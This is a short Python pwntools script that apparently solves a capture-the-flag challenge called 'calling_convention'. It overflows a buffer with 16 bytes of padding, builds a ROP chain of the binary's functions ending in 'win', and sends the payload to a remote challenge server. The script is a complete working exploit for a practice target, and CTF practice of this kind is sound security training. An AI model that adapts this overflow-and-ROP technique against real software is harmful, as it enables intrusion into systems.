from pwn import *                           
from Crypto.Util.number import *            
                                            
context.clear(arch='amd64')                 
# p = process("./calling_convention")       
p = remote("chal.bearcatctf.io", 39440)     
                                            
e = ELF("./calling_convention")             
                                            
rop = ROP([e])                              
                                            
rop.call("number3")                         
rop.call("food")                            
rop.call("set_key1")                        
rop.call("ahhhhhhhh")                       
rop.call("number3")                         
rop.call("win")                             
rop.call("exit")                            
                                            
print(rop.dump())                           
                                            
payload = b"AAAABBBBCCCCDDDD"               
payload += rop.chain()                      
                                            
with open("payload", "wb") as f:            
    f.write(payload)                        
print("Written")                            
                                            
print(payload)                              
                                            
print(p.recvline())                         
print(p.recvline())                         
print(p.recv())                             
p.sendline(payload)                         
print(p.recvline())                         
                                            